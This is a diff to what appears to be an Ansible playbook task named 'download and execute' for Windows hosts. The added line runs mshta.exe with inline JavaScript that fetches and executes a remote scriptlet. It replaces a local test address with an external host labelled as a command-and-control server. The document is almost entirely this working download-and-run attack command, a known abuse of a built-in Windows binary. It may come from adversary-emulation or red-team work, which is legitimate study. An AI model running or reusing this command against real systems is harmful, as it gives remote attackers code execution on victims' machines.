@@ -6,6 +6,6 @@
   tasks:
     - name: download and execute
       win_command: |
-        c:\windows\system32\mshta.exe javascript:a=GetObject("script:http://127.0.0.1:8000/mshta.sct").Exec();
+        c:\windows\system32\mshta.exe javascript:a=GetObject("script:http://cnc-nuance.eastus.cloudapp.azure.com:443/cnc.sct").Exec();
         
   
